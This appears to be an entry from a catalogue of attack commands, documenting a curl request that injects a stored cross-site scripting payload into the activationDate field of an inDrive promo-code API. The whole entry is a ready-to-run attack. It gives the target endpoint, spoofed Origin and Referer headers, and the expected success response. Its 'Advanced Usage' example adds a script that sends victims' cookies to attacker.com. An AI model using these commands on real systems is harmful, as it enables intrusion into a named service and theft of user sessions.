---
id: cmd-inject-xss-promocodes
data: >-
  curl -X POST https://id.indrive.com/api/spreadsheet/promocodes -H
  "Content-Type: application/json" -H "Origin: https://promo.indrive.com" -H
  "Referer: https://promo.indrive.com/" -d
  '{"id":"4","activationDate":"<script>alert(1)</script>"}'
tags:
  - xss
  - injection
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.039Z'
verified: false
validated: true
submitted: true
---
# inject-xss-payload-promocodes

## Command

```bash
curl -X POST https://id.indrive.com/api/spreadsheet/promocodes \
  -H "Content-Type: application/json" \
  -H "Origin: https://promo.indrive.com" \
  -H "Referer: https://promo.indrive.com/" \
  -d '{"id":"4","activationDate":"<script>alert(1)</script>"}'
```

## Description

This command sends a POST request to the inDrive PromoCodes API to inject a stored XSS payload into the activationDate field for a specified driver ID, exploiting lack of sanitization to store arbitrary JavaScript for later execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://id.indrive.com/api/spreadsheet/promocodes` | Target API endpoint | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Origin: https://promo.indrive.com"` | Mimics origin for CORS | Yes |
| `-H "Referer: https://promo.indrive.com/"` | Sets referer header | Yes |
| `-d '{"id":"4","activationDate":"<script>alert(1)</script>"}'` | JSON payload with driver ID and XSS script | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://id.indrive.com/api/spreadsheet/promocodes \
  -H "Content-Type: application/json" \
  -d '{"id":"4","activationDate":"<script>alert(1)</script>"}'
```

### Advanced Usage

```bash
# With custom payload for session theft
curl -X POST https://id.indrive.com/api/spreadsheet/promocodes \
  -H "Content-Type: application/json" \
  -d '{"id":"4","activationDate":"<script>fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)</script>"}'
```

## Expected Output

HTTP 200 OK response with JSON indicating successful storage, such as {"status":"success"} or similar API acknowledgment. No errors if the endpoint accepts the payload without validation.

## Related

- [[Related Procedure|procedures/Inject-and-Trigger-Stored-XSS-via-ActivationDate]]
